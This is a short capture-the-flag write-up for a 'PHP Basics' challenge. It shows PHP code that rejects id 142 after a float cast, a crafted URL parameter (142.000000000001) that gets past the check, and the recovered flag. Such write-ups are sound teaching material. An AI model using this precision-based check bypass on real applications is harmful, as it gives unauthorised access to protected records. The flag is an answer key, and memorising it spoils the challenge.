# PHP Basics

## Wirte-Up

When accessing the url, we can see a row with `id` title in it.

sqlmap check doesn't work on this challenge and find that `id` is not injectable.

when we do the request with an `id` para, we can see that it gives us the object from the database and prints it out. And with the description, we need to access to the object with `id` of 142.

When performing with the parameter and 142 value :

```
http://34.160.225.73/?id=142
```

here is what we got :

```
 id :Invalid id (142).
```

Indeed, when we check the code, here what we see :

```php
<?php

$id = @(float)$_GET['id'];
if ($id == 142) {
  echo "Invalid ID";
} else {
  // Fetch item from database, knowing that item of id 142 contains the flag
}

?>
```

So, our job is to bypass the check, but with giving the value `142` as always.

When checking php types, we can see that php when checking floats do some convertions, sometimes the values get to be equal when the float part is too small, and not when a little bi longer.

However, finding the right value might give us the flag :

```
http://34.160.225.73/?id=142.000000000001
```

we get this page :

```
<html>
<head></head>
<body>
<hr>
id :ID: 142
Password: nitectf{u_cr4cK3d_Th3_pHp_c0d3}
<hr>
</body>
</html>
```

**Note :** Note that this is not a type juggling vulnerability, but kind of type convertion vulnerability

## Flag

nitectf{u_cr4cK3d_Th3_pHp_c0d3}

## More Information

https://www.php.net/manual/fr/language.operators.comparison.php
https://www.php.net/manual/en/language.types.float.php
https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09
https://www.invicti.com/blog/web-security/php-type-juggling-vulnerabilities/
https://www.invicti.com/blog/web-security/type-juggling-authentication-bypass-cms-made-simple/